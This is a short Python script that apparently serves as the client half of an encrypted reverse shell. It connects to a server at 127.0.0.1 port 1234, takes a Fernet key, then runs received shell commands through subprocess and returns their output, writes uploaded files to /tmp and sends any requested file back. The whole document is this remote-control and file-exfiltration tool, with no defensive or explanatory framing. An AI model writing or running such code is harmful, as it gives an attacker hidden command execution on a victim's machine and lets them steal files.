import time
from cryptography.fernet import Fernet
import subprocess as sp
import socket
fernet = ""
HOST = "127.0.0.1"  # The server's hostname or IP address
PORT = 1234  # The port used by the server


def decrypt(data):
    return fernet.decrypt(data).decode()


def encrypt(data):
    return fernet.encrypt(data.encode())


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    while True:
        s.connect((HOST, PORT))
        key = s.recv(1024)
        fernet = Fernet(key)
        while True:
            data = decrypt(s.recv(1024))
            option, args = data.split(":")
            option = option.lower()
            if option == "cmd":
                s.send(encrypt(sp.getoutput(args)))
            elif option == "check":
                s.send(encrypt("1"))
            elif option == "file-u":
                try:
                    file = s.recv(1024)
                    with open(f"/tmp/{args}", "wb") as f:
                        f.write(file)
                    s.send(encrypt("1"))
                except:
                    s.send(encrypt("0"))
            elif option == "file-d":
                try:
                    with open(args, "rb") as f:
                        s.sendfile(f)
                except:
                    s.send("0")


